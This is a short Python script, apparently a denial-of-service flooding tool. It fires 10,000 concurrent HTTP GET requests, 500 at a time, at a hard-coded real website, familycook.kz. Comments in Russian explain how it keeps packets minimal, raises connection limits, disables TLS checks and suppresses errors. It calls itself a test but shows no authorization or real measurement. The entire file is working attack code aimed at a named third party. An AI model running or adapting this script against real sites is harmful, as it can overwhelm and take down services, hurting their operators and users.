import asyncio
import aiohttp
import time

TARGET_URL = "https://familycook.kz/"
CONCURRENT_REQUESTS = 500  # Сколько запросов отправлять ОДНОВРЕМЕННО

async def send_request(session, semaphore, i):
    async with semaphore: # Ограничиваем количество параллельных задач
        try:
            # Используем пустой заголовок, чтобы пакет был минимального размера
            async with session.get(f"{TARGET_URL}{i}", ssl=False) as response:
                if i % 100 == 0:
                    print(f"Отправлено: {i} | Статус: {response.status}")
        except:
            pass

async def main():
    semaphore = asyncio.Semaphore(CONCURRENT_REQUESTS)
    # Используем TCPConnector с увеличенным лимитом соединений
    connector = aiohttp.TCPConnector(limit=CONCURRENT_REQUESTS, ssl=False)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [send_request(session, semaphore, i) for i in range(10000)]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    start = time.time()
    asyncio.run(main())
    print(f"Тест завершен за {time.time() - start:.2f} сек.")